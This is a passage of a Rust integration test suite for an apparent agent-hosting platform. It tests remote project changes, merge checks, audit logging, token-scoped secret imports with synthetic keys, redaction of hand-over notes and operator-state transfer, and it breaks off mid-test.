        "project_change",
        shop(json!({"title": "ci", "files": [{"path": "yulius.toml", "content": broken}]})),
    )
    .await?;
    assert!(!error, "{said}");
    let record =
        w.h.store
            .sandbox_by_repo("Quartio-Studio", "shop")
            .await?
            .ok_or("sandbox")?;
    w.h.app.ci_sync_sandbox(&record).await?;
    let number = change["pull_request"]["number"].as_u64().ok_or("number")?;
    let (error, said, _) =
        remote(&w, &alice, "change_merge", shop(json!({"number": number}))).await?;
    assert!(error && said.contains("yulius.toml"), "{said}");
    Ok(())
}

/// The other half: the integration branch's configuration is broken.
#[tokio::test]
async fn a_broken_integration_ci_is_named_when_merging() -> TestResult {
    let w = World::new("org").await?;
    let (alice, _) = imported_shop(
        &w,
        &[
            ("README.md", "# Shop\n"),
            ("yulius.toml", "[[ci.jobs]]\nname = 3\n"),
        ],
    )
    .await?;
    let fixed = "[[ci.jobs]]\nname = \"test\"\ncommand = \"true\"\n";
    let (error, said, change) = remote(
        &w,
        &alice,
        "project_change",
        json!({"project": "Quartio-Studio/shop", "title": "ci: fix", "files": [{"path": "yulius.toml", "content": fixed}]}),
    )
    .await?;
    assert!(!error, "{said}");
    let number = change["pull_request"]["number"].as_u64().ok_or("number")?;
    let (error, said, _) = remote(
        &w,
        &alice,
        "change_merge",
        json!({"project": "Quartio-Studio/shop", "number": number}),
    )
    .await?;
    assert!(error && said.contains("tests nothing"), "{said}");
    Ok(())
}

/// Holds the next change at the moment its files are written (before the commit) until `release`
/// gets a message; `entered` gets one when it is held there.
fn hold_next_change(
    w: &World,
) -> Result<(std::sync::mpsc::Receiver<()>, std::sync::mpsc::Sender<()>), Error> {
    let changes = w.data_dir().join("changes");
    std::fs::create_dir_all(&changes)?;
    let (entered_tx, entered) = std::sync::mpsc::channel();
    let (release, release_rx) = std::sync::mpsc::channel::<()>();
    yulius_app::race::on(
        yulius_app::race::Point::ChangeWritten,
        &changes,
        move || {
            let _ = entered_tx.send(());
            let _ = release_rx.recv_timeout(std::time::Duration::from_secs(60));
        },
    );
    Ok((entered, release))
}

/// Waits (at most 60 s) until a change held by [`hold_next_change`] is held.
async fn held(entered: std::sync::mpsc::Receiver<()>) -> TestResult {
    tokio::task::spawn_blocking(move || entered.recv_timeout(std::time::Duration::from_secs(60)))
        .await??;
    Ok(())
}

/// A `project_change` call over the public `/mcp`, as its own task (which a test may abort, as a
/// client that goes away).
fn change_call(
    w: &World,
    creds: &Creds,
    path: &str,
) -> tokio::task::JoinHandle<Result<support::Resp, String>> {
    let (router, creds) = (w.h.router.clone(), creds.clone());
    let body = json!({"jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": {"name": "project_change", "arguments": {
        "project": "Quartio-Studio/shop", "title": path, "files": [{"path": path, "content": "x\n"}]}}});
    tokio::spawn(async move {
        call(&router, Method::POST, "/mcp", Some(body), &creds)
            .await
            .map_err(|e| e.to_string())
    })
}

/// Waits (at most 60 s) until `done` holds.
async fn eventually<F, Fut>(what: &str, mut done: F) -> TestResult
where
    F: FnMut() -> Fut,
    Fut: std::future::Future<Output = Result<bool, Error>>,
{
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(60);
    while !done().await? {
        if std::time::Instant::now() > deadline {
            return Err(format!("never: {what}").into());
        }
        tokio::time::sleep(std::time::Duration::from_millis(20)).await;
    }
    Ok(())
}

/// RMT-015, RMT-025 (round-3 review): a change whose caller goes away mid-way still finishes:
/// its pull request is opened and recorded, its scratch clone removed, and the call audited with
/// its token.
#[tokio::test]
async fn a_change_finishes_and_is_audited_when_its_caller_goes_away() -> TestResult {
    let w = World::new("org").await?;
    let (alice, _) = imported_shop(&w, &[("README.md", "# Shop\n")]).await?;
    let (entered, release) = hold_next_change(&w)?;
    let request = change_call(&w, &alice, "gone.txt");
    held(entered).await?;
    request.abort();
    assert!(request.await.is_err(), "the caller went away");
    release.send(())?;
    let sid =
        w.h.store
            .sandbox_by_repo("Quartio-Studio", "shop")
            .await?
            .ok_or("sandbox")?
            .id;
    eventually("the call is audited", || async {
        Ok(audits(&w, sid.as_str())
            .await?
            .iter()
            .any(|(action, _, detail)| {
                action == "remote.tool"
                    && detail.contains("\"tool\":\"project_change\"")
                    && detail.contains("\"ok\":true")
            }))
    })
    .await?;
    assert!(
        w.h.github
            .pull(1)
            .is_some_and(|p| p.head.starts_with("yulius/change-")),
        "the pull request is open"
    );
    assert!(
        audits(&w, sid.as_str())
            .await?
            .iter()
            .any(|(action, _, _)| action == "project.change")
    );
    assert_eq!(
        std::fs::read_dir(w.data_dir().join("changes"))?.count(),
        0,
        "the scratch clone is gone"
    );
    Ok(())
}

/// RMT-025 (round-3 review): two changes are made at once; a third is refused at once rather
/// than queued.
#[tokio::test]
async fn a_third_change_at_once_is_refused_not_queued() -> TestResult {
    let w = World::new("org").await?;
    let (alice, _) = imported_shop(&w, &[("README.md", "# Shop\n")]).await?;
    let (first_in, first_out) = hold_next_change(&w)?;
    let (second_in, second_out) = hold_next_change(&w)?;
    let first = change_call(&w, &alice, "one.txt");
    let second = change_call(&w, &alice, "two.txt");
    held(first_in).await?;
    held(second_in).await?;
    let (error, said, _) = remote(
        &w,
        &alice,
        "project_change",
        json!({"project": "Quartio-Studio/shop", "title": "three", "files": [{"path": "three.txt", "content": "x\n"}]}),
    )
    .await?;
    assert!(error && said.contains("try again"), "{said}");
    first_out.send(())?;
    second_out.send(())?;
    for done in [first.await?, second.await?] {
        let done = done?;
        assert_eq!(done.body["result"]["isError"], false, "{}", done.body);
    }
    Ok(())
}

/// RMT-026 (round-3 review): a change Yulius could not record says so, and change_merge does not
/// merge it.
#[tokio::test]
async fn an_unrecorded_change_says_so_and_does_not_merge() -> TestResult {
    let w = World::new("org").await?;
    let (alice, _) = imported_shop(&w, &[("README.md", "# Shop\n")]).await?;
    w.h.store
        .execute_for_tests(
            "CREATE TRIGGER no_change_record BEFORE INSERT ON audit_log WHEN NEW.action = 'project.change' \
             BEGIN SELECT RAISE(ABORT, 'refused'); END;",
        )
        .await?;
    let (error, said, made) = remote(
        &w,
        &alice,
        "project_change",
        json!({"project": "Quartio-Studio/shop", "title": "docs", "files": [{"path": "a.md", "content": "a\n"}]}),
    )
    .await?;
    assert!(!error, "the pull request exists: {said}");
    assert!(
        text(&made["warning"]).contains("will not merge it"),
        "{made}"
    );
    let number = made["pull_request"]["number"].as_u64().ok_or("number")?;
    let (error, said, _) = remote(
        &w,
        &alice,
        "change_merge",
        json!({"project": "Quartio-Studio/shop", "number": number}),
    )
    .await?;
    assert!(
        error && said.contains("only pull requests project_change opened"),
        "{said}"
    );
    Ok(())
}

/// RMT-025 (round-3 review): when GitHub refuses the pull request, the pushed branch is deleted,
/// so no change branch is left without a pull request.
#[tokio::test]
async fn a_refused_pull_request_leaves_no_branch() -> TestResult {
    let w = World::new("org").await?;
    let (alice, origin) = imported_shop(&w, &[("README.md", "# Shop\n")]).await?;
    if let Ok(mut refusal) = w.h.github.create_pull_error.lock() {
        *refusal = Some("GitHub refused the request (HTTP 422)".into());
    }
    let (error, said, _) = remote(
        &w,
        &alice,
        "project_change",
        json!({"project": "Quartio-Studio/shop", "title": "docs", "files": [{"path": "a.md", "content": "a\n"}]}),
    )
    .await?;
    assert!(error && said.contains("422"), "{said}");
    let branches = support::repos::git(&origin, &["branch", "--list", "yulius/change-*"])?;
    assert_eq!(branches.trim(), "", "no change branch is left");
    // Audited once, as failed (round-3 review: the spawned task audits, the caller does not).
    let sid =
        w.h.store
            .sandbox_by_repo("Quartio-Studio", "shop")
            .await?
            .ok_or("sandbox")?
            .id;
    let audited: Vec<String> = audits(&w, sid.as_str())
        .await?
        .into_iter()
        .filter(|(action, _, detail)| {
            action == "remote.tool" && detail.contains("\"tool\":\"project_change\"")
        })
        .map(|(_, _, detail)| detail)
        .collect();
    assert_eq!(audited.len(), 1, "{audited:?}");
    assert!(audited[0].contains("\"ok\":false"), "{audited:?}");
    Ok(())
}

/// The agent secrets of a sandbox by name, as the Secrets page lists them.
async fn agent_secrets(w: &World, sid: &str, creds: &Creds) -> Result<Vec<Value>, Error> {
    let listed = call(
        &w.h.router,
        Method::GET,
        &format!("/api/sandboxes/{sid}/agent-secrets"),
        None,
        creds,
    )
    .await?;
    assert_eq!(listed.status, StatusCode::OK, "{}", listed.body);
    Ok(listed.body.as_array().cloned().unwrap_or_default())
}

/// SPEC-256: with one token made for their agent, a person's laptop agent uploads the checkout,
/// moves the project's keys (a dotenv file and a key file, read by the CLI, never printed) into
/// agent secrets already usable in `.env` files, and starts onboarding with its hand-over, which
/// the onboarding task's request holds, redacted. Nothing waits for the person.
#[tokio::test]
async fn a_laptop_project_is_onboarded_by_its_agent_alone() -> TestResult {
    let w = World::new("org").await?;
    let (alice, browser, _) = person(&w, "alice").await?;
    let origin = w.remote(
        support::repos::OWNER,
        "shop",
        &[
            ("README.md", "# Shop\n"),
            ("deploy.sh", "ssh deploy@host\n"),
        ],
        &[],
    )?;
    w.github
        .add_installation_repo(support::repos::OWNER, "shop", true);
    w.grant("alice", "shop", "admin");
    let token =
        text(&make_token(&w, &browser, "laptop agent", "operate").await?["token"]).to_owned();
    let served = support::serve(w.h.router.clone()).await?;
    let url = format!("http://{}", served.addr);
    let home = tempfile::tempdir()?;
    let home = home.path();
    let (code, out, err) = yulius_cli(
        home,
        &["remote", "login", &url, "--token-stdin"],
        &format!("{token}\n"),
    )
    .await?;
    assert_eq!(code, Some(0), "{out}{err}");

    // The laptop's checkout, cloned from GitHub.
    support::repos::git(
        home,
        &["clone", "--quiet", &origin.to_string_lossy(), "shop"],
    )?;
    let checkout = home.join("shop");
    support::repos::git(
        &checkout,
        &[
            "remote",
            "set-url",
            "origin",
            "https://github.com/Quartio-Studio/shop.git",
        ],
    )?;

    // 1. The checkout goes up with the agent's token: no `yulius login`, no browser.
    let (code, out, err) = yulius_cli(
        home,
        &[
            "onboard",
            "shop",
            "--yes",
            "--sessions",
            "none",
            "--no-color",
        ],
        "",
    )
    .await?;
    assert_eq!(code, Some(0), "{out}{err}");
    assert!(!out.contains("approve this computer"), "{out}");
    let sandbox =
        w.h.store
            .sandbox_by_repo("Quartio-Studio", "shop")
            .await?
            .ok_or("the project was added")?;
    assert_eq!(sandbox.onboarding_state, "pending");
    let sid = sandbox.id.as_str().to_owned();

    // 2. Its keys, with no terminal to type yes at.
    let api_value = format!("api-{}", "k3y".repeat(6));
    std::fs::write(
        checkout.join(".env"),
        format!("# The shop's payment API\nPAYMENTS_TOKEN={api_value}\n"),
    )?;
    let key = format!(
        "-----BEGIN OPENSSH PRIVATE KEY-----\n{}\n{}\n-----END OPENSSH PRIVATE KEY-----\n",
        "b3BlbnNzaC1rZXktdjEAAAAA".repeat(2),
        "QyNTUxOQAAACD".repeat(3)
    );
    std::fs::create_dir_all(home.join(".ssh"))?;
    std::fs::write(home.join(".ssh/deploy_ed25519"), &key)?;
    let import = [
        "secrets",
        "import",
        "--to",
        "agent",
        "--sandbox",
        "Quartio-Studio/shop",
        "--yes",
        "--env-files",
        "--no-color",
        "shop/.env",
        "--from-file",
        // As a shell passes it unexpanded: the CLI reads `~/` as the home.
        "DEPLOY_SSH_KEY=~/.ssh/deploy_ed25519",
    ];
    let (code, out, err) = yulius_cli(home, &import, "").await?;
    assert_eq!(code, Some(0), "{out}{err}");
    assert!(
        out.contains("PAYMENTS_TOKEN") && out.contains("DEPLOY_SSH_KEY"),
        "{out}"
    );
    for leaked in [api_value.as_str(), "b3BlbnNzaC1rZXktdjEAAAAA"] {
        assert!(!out.contains(leaked) && !err.contains(leaked), "{out}{err}");
    }
    let secrets = agent_secrets(&w, &sid, &browser).await?;
    for name in ["PAYMENTS_TOKEN", "DEPLOY_SSH_KEY"] {
        let secret = secrets
            .iter()
            .find(|s| s["name"] == name)
            .ok_or_else(|| format!("{name} in {secrets:?}"))?;
        assert_eq!(secret["env_files"], "allowed", "{secret}");
        assert_eq!(secret["auto_allow"], true, "{secret}");
    }
    let described = |name: &str| {
        secrets
            .iter()
            .find(|s| s["name"] == name)
            .map(|s| text(&s["description"]).to_owned())
            .unwrap_or_default()
    };
    assert_eq!(described("PAYMENTS_TOKEN"), "The shop's payment API");
    assert!(
        described("DEPLOY_SSH_KEY").contains("deploy_ed25519"),
        "{secrets:?}"
    );
    let key_id = secrets
        .iter()
        .find(|s| s["name"] == "DEPLOY_SSH_KEY")
        .map(|s| text(&s["id"]).to_owned())
        .unwrap_or_default();
    let audit = audits(&w, &key_id).await?;
    assert!(
        audit
            .iter()
            .any(|(action, actor, _)| action == "vault.agent.env_allow" && actor.contains("alice")),
        "{audit:?}"
    );

    // Again: everything exists, nothing is overwritten.
    let (code, out, err) = yulius_cli(home, &import, "").await?;
    assert_eq!(code, Some(0), "{out}{err}");
    assert!(out.contains("exists"), "{out}");

    // 3. Onboarding starts with the agent's hand-over, redacted; a hand-over past 24 KiB is
    // refused and starts nothing.
    std::fs::write(home.join("long.md"), "x".repeat(25 * 1024))?;
    let (code, _, err) = yulius_cli(
        home,
        &[
            "project",
            "onboard",
            "-p",
            "Quartio-Studio/shop",
            "--notes",
            "long.md",
        ],
        "",
    )
    .await?;
    assert_eq!(code, Some(1), "{err}");
    assert!(err.contains("24 KiB"), "{err}");
    let still =
        w.h.store
            .sandbox_by_repo("Quartio-Studio", "shop")
            .await?
            .ok_or("sandbox")?;
    assert_eq!(still.onboarding_state, "pending");
    let leaked_token = format!("ghp_{}", &"aB3dE".repeat(8)[..36]);
    std::fs::write(
        home.join("handover.md"),
        format!(
            "Deploys run ./deploy.sh over ssh as deploy@203.0.113.7 with DEPLOY_SSH_KEY.\n\
             The old CI used {leaked_token}.\n"
        ),
    )?;
    let (code, out, err) = yulius_cli(
        home,
        &[
            "project",
            "onboard",
            "-p",
            "Quartio-Studio/shop",
            "--notes",
            "handover.md",
        ],
        "",
    )
    .await?;
    assert_eq!(code, Some(0), "{out}{err}");
    let sandbox =
        w.h.store
            .sandbox_by_repo("Quartio-Studio", "shop")
            .await?
            .ok_or("sandbox")?;
    assert_eq!(sandbox.onboarding_state, "preparing");
    let task =
        w.h.store
            .task(
                sandbox
                    .onboarding_task_id
                    .as_ref()
                    .ok_or("onboarding task")?,
            )
            .await?
            .ok_or("task")?;
    assert!(
        task.prompt
            .contains("Hand-over from alice's agent on their computer")
            && task.prompt.contains("deploy@203.0.113.7"),
        "{}",
        task.prompt
    );
    assert!(!task.prompt.contains(&leaked_token), "{}", task.prompt);
    assert!(task.prompt.contains("secrets_list"), "{}", task.prompt);

    // Once it started, notes go to its task instead.
    let (code, _, err) = yulius_cli(
        home,
        &[
            "project",
            "onboard",
            "-p",
            "Quartio-Studio/shop",
            "--notes",
            "handover.md",
        ],
        "",
    )
    .await?;
    assert_eq!(code, Some(1), "{err}");
    assert!(err.contains("task_message"), "{err}");
    drop(alice);
    Ok(())
}

/// SPEC-256 LOB-002: `--yes` needs the token made for the person's agent with `operate`: with a
/// `yulius login` token or a read token nothing is sent.
#[tokio::test]
async fn an_unattended_import_needs_an_operate_token() -> TestResult {
    let w = World::new("org").await?;
    support::seed_sandbox(&w.h, "s1", "shop", "u-alice").await?;
    let (alice, cli) = w.user("alice", false).await?;
    w.grant("alice", "acme/shop", "admin");
    let browser = w.browser(&alice).await?;
    let served = support::serve(w.h.router.clone()).await?;
    let url = format!("http://{}", served.addr);
    let import = |file: &str| -> Vec<String> {
        [
            "secrets",
            "import",
            "--to",
            "agent",
            "--sandbox",
            "acme/shop",
            "--yes",
            file,
        ]
        .iter()
        .map(|a| (*a).to_owned())
        .collect()
    };

    // Only `yulius login`'s token.
    let home = tempfile::tempdir()?;
    let home = home.path();
    std::fs::create_dir_all(home.join(".config/yulius"))?;
    std::fs::write(
        home.join(".config/yulius/credentials.json"),
        json!({"version": 1, "servers": {url.clone(): {"token": cli.bearer.clone()}}}).to_string(),
    )?;
    std::fs::write(home.join("keys.env"), "UNSENT_KEY=abcdefgh12345678\n")?;
    let args = import("keys.env");
    let args: Vec<&str> = args.iter().map(String::as_str).collect();
    let (code, out, err) = yulius_cli(home, &args, "").await?;
    assert_eq!(code, Some(1), "{out}{err}");
    assert!(err.contains("yulius remote login"), "{err}");

    // A read token made for the agent.
    let read = text(&make_token(&w, &browser, "reader", "read").await?["token"]).to_owned();
    let (code, out, err) = yulius_cli(
        home,
        &["remote", "login", &url, "--token-stdin"],
        &format!("{read}\n"),
    )
    .await?;
    assert_eq!(code, Some(0), "{out}{err}");
    let (code, out, err) = yulius_cli(home, &args, "").await?;
    assert_eq!(code, Some(1), "{out}{err}");
    assert!(err.contains("operate"), "{err}");
    let secrets = agent_secrets(&w, "s1", &browser).await?;
    assert!(
        secrets.iter().all(|s| s["name"] != "UNSENT_KEY"),
        "nothing was sent: {secrets:?}"
    );

    // With an operate token, what the run was given is checked before anything is sent.
    let operate = text(&make_token(&w, &browser, "laptop", "operate").await?["token"]).to_owned();
    let (code, out, err) = yulius_cli(
        home,
        &["remote", "login", &url, "--token-stdin"],
        &format!("{operate}\n"),
    )
    .await?;
    assert_eq!(code, Some(0), "{out}{err}");
    std::fs::write(home.join("key.pem"), "single-line-key-value-0123\n")?;
    let refusals: [(&[&str], &str); 5] = [
        (
            &["--from-file", "UNSENT_KEY=key.pem"],
            "UNSENT_KEY is given twice",
        ),
        (
            &[
                "--from-file",
                "OTHER_KEY=key.pem",
                "--from-file",
                "OTHER_KEY=key.pem",
            ],
            "OTHER_KEY is given twice",
        ),
        (&["--from-file", "key.pem"], "NAME=PATH"),
        (&["--from-file", "GONE_KEY=~/gone.pem"], "gone.pem"),
        (
            &["--env-files", "--confirm-hosts"],
            "--env-files is for secrets agents set up",
        ),
    ];
    for (extra, said) in refusals {
        let mut args: Vec<&str> = vec![
            "secrets",
            "import",
            "--to",
            "agent",
            "--sandbox",
            "acme/shop",
            "--yes",
            "keys.env",
        ];
        args.extend_from_slice(extra);
        let (code, out, err) = yulius_cli(home, &args, "").await?;
        assert_eq!(code, Some(1), "{extra:?}: {out}{err}");
        assert!(err.contains(said), "{extra:?}: {err}");
    }
    for (args, said) in [
        (
            &[
                "secrets",
                "import",
                "--to",
                "team",
                "--sandbox",
                "acme/shop",
                "--env-files",
                "keys.env",
            ][..],
            "--env-files applies to --to agent",
        ),
        (
            &[
                "secrets",
                "import",
                "--to",
                "agent",
                "--sandbox",
                "acme/shop",
                "--yes",
            ][..],
            "never typed",
        ),
    ] {
        let (code, out, err) = yulius_cli(home, args, "").await?;
        assert_eq!(code, Some(1), "{args:?}: {out}{err}");
        assert!(err.contains(said), "{args:?}: {err}");
    }
    let secrets = agent_secrets(&w, "s1", &browser).await?;
    assert!(
        secrets
            .iter()
            .all(|s| s["name"] != "UNSENT_KEY" && s["name"] != "OTHER_KEY"),
        "nothing was sent: {secrets:?}"
    );
    Ok(())
}

/// SPEC-256 LOB-005, review round 1: the hand-over needs a usable Claude account before anything
/// is created; a retried start adds it once; a task that already tried to run is refused with
/// what to do; blank notes on a started onboarding are no notes.
#[tokio::test]
async fn a_hand_over_is_added_once_and_only_where_it_can_be_read() -> TestResult {
    use yulius_domain::task::TaskStatus;
    let w = World::without_claude("org").await?;
    let (_, _, agent) = person(&w, "alice").await?;
    w.remote(
        support::repos::OWNER,
        "shop",
        &[("README.md", "# Shop\n")],
        &[],
    )?;
    w.github
        .add_installation_repo(support::repos::OWNER, "shop", true);
    w.grant("alice", "shop", "admin");
    let shop = |extra: Value| {
        let mut args = json!({"project": "Quartio-Studio/shop"});
        if let (Some(args), Some(extra)) = (args.as_object_mut(), extra.as_object()) {
            args.extend(extra.clone());
        }
        args
    };
    let (error, said, _) = remote(
        &w,
        &agent,
        "project_import",
        json!({"repo": "Quartio-Studio/shop"}),
    )
    .await?;
    assert!(!error, "{said}");
    let notes = "Deploys run ./deploy.sh as deploy@203.0.113.7.";

    // No Claude account: refused before the onboarding task exists.
    let (error, said, _) = remote(
        &w,
        &agent,
        "onboarding_start",
        shop(json!({"notes": notes})),
    )
    .await?;
    assert!(error, "{said}");
    let sandbox =
        w.h.store
            .sandbox_by_repo("Quartio-Studio", "shop")
            .await?
            .ok_or("sandbox")?;
    assert_eq!(sandbox.onboarding_task_id, None, "nothing was created");

    // A start that failed after the hand-over joined the request: the retry adds it once.
    support::exhausted_subscription(&w.h).await?;
    let (error, said, _) = remote(
        &w,
        &agent,
        "task_create",
        shop(json!({"prompt": "Add a /health endpoint"})),
    )
    .await?;
    assert!(!error, "{said}");
    let sandbox =
        w.h.store
            .sandbox_by_repo("Quartio-Studio", "shop")
            .await?
            .ok_or("sandbox")?;
    let task_id = sandbox
        .onboarding_task_id
        .clone()
        .ok_or("onboarding task")?;
    let addition = yulius_domain::request::handover_addition("alice", notes).ok_or("addition")?;
    assert!(
        w.h.store
            .append_resting_prompt(&task_id, &addition, 64 * 1024, w.h.app.now())
            .await?
    );
    // The same task already tried to run once: notes can no longer join what it read.
    let resting = w.h.store.task(&task_id).await?.ok_or("task")?.status;
    w.h.store
        .transition_task(&task_id, None, TaskStatus::Queued, None, w.h.app.now())
        .await?;
    let (error, said, _) = remote(
        &w,
        &agent,
        "onboarding_start",
        shop(json!({"notes": "Something new"})),
    )
    .await?;
    assert!(error && said.contains("without notes"), "{said}");
    w.h.store
        .transition_task(&task_id, None, resting, None, w.h.app.now())
        .await?;
    let (error, said, started) = remote(
        &w,
        &agent,
        "onboarding_start",
        shop(json!({"notes": notes})),
    )
    .await?;
    assert!(!error, "{said}");
    assert_eq!(started["onboarding"], "preparing", "{started}");
    let prompt = w.h.store.task(&task_id).await?.ok_or("task")?.prompt;
    assert_eq!(prompt.matches("deploy@203.0.113.7").count(), 1, "{prompt}");

    // Blank notes once it started are no notes.
    let (error, said, _) = remote(
        &w,
        &agent,
        "onboarding_start",
        shop(json!({"notes": " \n"})),
    )
    .await?;
    assert!(!error, "{said}");
    Ok(())
}

/// SPEC-256 LOB-005, review round 2: a start or skip landing between Start onboarding's read and
/// its start refuses the hand-over instead of dropping it unsaid.
#[tokio::test(flavor = "multi_thread")]
async fn a_hand_over_overtaken_by_another_start_is_refused() -> TestResult {
    use yulius_app::ports::store::SandboxStore as _;
    let w = World::new("org").await?;
    let (_, _, agent) = person(&w, "alice").await?;
    w.remote(
        support::repos::OWNER,
        "shop",
        &[("README.md", "# Shop\n")],
        &[],
    )?;
    w.github
        .add_installation_repo(support::repos::OWNER, "shop", true);
    w.grant("alice", "shop", "admin");
    let (error, said, imported) = remote(
        &w,
        &agent,
        "project_import",
        json!({"repo": "Quartio-Studio/shop"}),
    )
    .await?;
    assert!(!error, "{said}");
    let sid = yulius_domain::ids::SandboxId::parse(text(&imported["id"]))?;
    {
        let (store, key, sid) = (w.h.store.clone(), sid.as_str().to_owned(), sid.clone());
        let handle = tokio::runtime::Handle::current();
        yulius_app::race::on(
            yulius_app::race::Point::OnboardingApproved,
            std::path::Path::new(&key),
            move || {
                let moved = tokio::task::block_in_place(|| {
                    handle.block_on(store.transition_onboarding(&sid, "pending", "preparing"))
                });
                assert!(matches!(moved, Ok(true)), "{moved:?}");
            },
        );
    }
    let (error, said, _) = remote(
        &w,
        &agent,
        "onboarding_start",
        json!({"project": "Quartio-Studio/shop", "notes": "Deploys run ./deploy.sh."}),
    )
    .await?;
    assert!(error && said.contains("already started"), "{said}");
    Ok(())
}

/// SPEC-271 (AC1..AC4): with only the operate token made for their agent, a person's laptop agent
/// sends the project's operator state (a folder with a 50 MiB file, nested folders and modes) with
/// `yulius secrets import --state`, showing no content; a task restores it into the sandbox home;
/// the laptop's second send is then refused, so the two copies never fork; the task's saved copy
/// comes back with `yulius secrets state-get`, and `--replace-state` overwrites it on purpose.
#[tokio::test]
async fn a_laptops_operator_state_moves_into_the_sandbox_with_one_writer() -> TestResult {
    use std::os::unix::fs::PermissionsExt as _;
    use yulius_app::ports::vault::VaultStore as _;
    use yulius_domain::task::TaskStatus;

    const TASK_TOKEN: &str = "state-move-task-token-s1-0123456789";
    let w = World::new("org").await?;
    support::seed_sandbox(&w.h, "s1", "shop", "u-alice").await?;
    let (alice, _) = w.user("alice", false).await?;
    w.grant("alice", "acme/shop", "admin");
    let browser = w.browser(&alice).await?;
    let token =
        text(&make_token(&w, &browser, "laptop agent", "operate").await?["token"]).to_owned();
    let served = support::serve(w.h.router.clone()).await?;
    let url = format!("http://{}", served.addr);
    let laptop = tempfile::tempdir()?;
    let laptop = laptop.path();
    let (code, out, err) = yulius_cli(
        laptop,
        &["remote", "login", &url, "--token-stdin"],
        &format!("{token}\n"),
    )
    .await?;
    assert_eq!(code, Some(0), "{out}{err}");

    // The Deployer's state on the laptop.
    let ops = laptop.join(".quartio-operator-20260901");
    std::fs::create_dir_all(ops.join("rollouts/2026-10-01"))?;
    std::fs::write(
        ops.join("inventory.sqlite"),
        b"SQLite format 3\0pinned-host-key-v1",
    )?;
    std::fs::set_permissions(
        ops.join("inventory.sqlite"),
        std::fs::Permissions::from_mode(0o600),
    )?;
    std::fs::write(
        ops.join("rollouts/2026-10-01/operator.json"),
        b"{\"step\": 1}",
    )?;
    let mut big = Vec::with_capacity(50 << 20);
    let mut x: u64 = 0x2545_f491_4f6c_dd1d;
    while big.len() < 50 << 20 {
        x ^= x << 13;
        x ^= x >> 7;
        x ^= x << 17;
        big.extend_from_slice(&x.to_le_bytes());
    }
    std::fs::write(ops.join("rollouts/2026-10-01/bundle.bin"), &big)?;
    std::fs::set_permissions(
        ops.join("rollouts/2026-10-01"),
        std::fs::Permissions::from_mode(0o755),
    )?;
    let send = |replace: bool| {
        let mut args = vec![
            "secrets",
            "import",
            "--to",
            "agent",
            "--sandbox",
            "acme/shop",
            "--yes",
            "--no-color",
            // As a shell passes it unexpanded: the CLI reads `~/` as the home.
            "--state",
            "QUARTIO_OPERATOR=~/.quartio-operator-20260901",
        ];
        if replace {
            args.push("--replace-state");
        }
        args
    };

    // 1. Sent with no terminal, names and sizes only.
    let (code, out, err) = yulius_cli(laptop, &send(false), "").await?;
    assert_eq!(code, Some(0), "{out}{err}");
    assert!(
        out.contains("QUARTIO_OPERATOR") && out.contains("3 files") && out.contains("version 1"),
        "{out}"
    );
    assert!(out.contains("stop using the folder"), "{out}");
    assert!(
        !out.contains("pinned-host-key") && !err.contains("pinned-host-key"),
        "{out}{err}"
    );

    // 2. A task of the project restores it into the sandbox home.
    support::seed_task(&w.h, "t1", "s1", "u-alice", TaskStatus::Running, None).await?;
    support::seed_live_attempt(&w.h, "t1", TASK_TOKEN).await?;
    let home = w.h.app.config.data_dir.join("sandboxes/s1/home");
    std::fs::create_dir_all(&home)?;
    let restore = support::mcp_tool(
        &w.h,
        TASK_TOKEN,
        "secret_state_restore",
        json!({"name": "QUARTIO_OPERATOR", "path": "~/.quartio-operator-20260901"}),
    )
    .await?;
    let restored = support::tool_text(&restore);
    assert_eq!(restored["files"], 3, "{restored}");
    let copy = home.join(".quartio-operator-20260901");
    assert_eq!(
        std::fs::metadata(copy.join("inventory.sqlite"))?
            .permissions()
            .mode()
            & 0o777,
        0o600
    );
    assert_eq!(
        std::fs::read(copy.join("rollouts/2026-10-01/bundle.bin"))?,
        big
    );
    assert_eq!(
        std::fs::metadata(copy.join("rollouts/2026-10-01"))?
            .permissions()
            .mode()
            & 0o777,
        0o755
    );

    // 3. The laptop sends again: refused, nothing changes.
    let (code, out, err) = yulius_cli(laptop, &send(false), "").await?;
    assert_eq!(code, Some(1), "{out}{err}");
    assert!(
        out.contains("refused QUARTIO_OPERATOR")
            && out.contains("was restored into the sandbox at ~/.quartio-operator-20260901"),
        "the server's refusal: {out}"
    );

    // 4. A rollout writes the sandbox's copy; the task saves it; the laptop gets it back.
    std::fs::write(
        copy.join("inventory.sqlite"),
        b"SQLite format 3\0pinned-host-key-v2",
    )?;
    let saved = support::tool_text(
        &support::mcp_tool(
            &w.h,
            TASK_TOKEN,
            "secret_state_save",
            json!({"name": "QUARTIO_OPERATOR"}),
        )
        .await?,
    );
    assert_eq!(saved["version"], 2, "{saved}");
    let (code, out, err) = yulius_cli(
        laptop,
        &[
            "secrets",
            "state-get",
            "QUARTIO_OPERATOR",
            "--sandbox",
            "acme/shop",
            "--out",
            "ops-back.tar.gz",
        ],
        "",
    )
    .await?;
    assert_eq!(code, Some(0), "{out}{err}");
    assert!(out.contains("stays the one written to"), "{out}");
    let back = laptop.join("ops-back.tar.gz");
    assert_eq!(std::fs::metadata(&back)?.permissions().mode() & 0o077, 0);
    std::fs::create_dir(laptop.join("back"))?;
    let unpacked = std::process::Command::new("tar")
        .args(["-xzf", "ops-back.tar.gz", "-C", "back"])
        .current_dir(laptop)
        .status()?;
    assert!(unpacked.success());
    assert_eq!(
        std::fs::read(laptop.join("back/inventory.sqlite"))?,
        b"SQLite format 3\0pinned-host-key-v2"
    );
    // Never over an existing file.
    let (code, _, err) = yulius_cli(
        laptop,
        &[
            "secrets",
            "state-get",
            "QUARTIO_OPERATOR",
            "--sandbox",
            "acme/shop",
            "--out",
            "ops-back.tar.gz",
        ],
        "",
    )
    .await?;
    assert_eq!(code, Some(1), "{err}");

    // A read-only token of the same person never downloads it (review of SPEC-271, M4).
    let read = text(&make_token(&w, &browser, "reader", "read").await?["token"]).to_owned();
    let refused = call(
        &w.h.router,
        Method::GET,
        "/api/sandboxes/s1/agent-states/QUARTIO_OPERATOR/archive",
        None,
        &bearer(&read),
    )
    .await?;
    assert_eq!(refused.status, StatusCode::FORBIDDEN, "{}", refused.body);

    // 5. On purpose, the laptop's copy replaces the sandbox's.
    let (code, out, err) = yulius_cli(laptop, &send(true), "").await?;
    assert_eq!(code, Some(0), "{out}{err}");
    assert!(out.contains("version 3"), "{out}");

    // Refused before anything is read or sent.
    for (args, said) in [
        (
            vec![
                "--to",
                "team",
                "--state",
                "OPS=~/.quartio-operator-20260901",
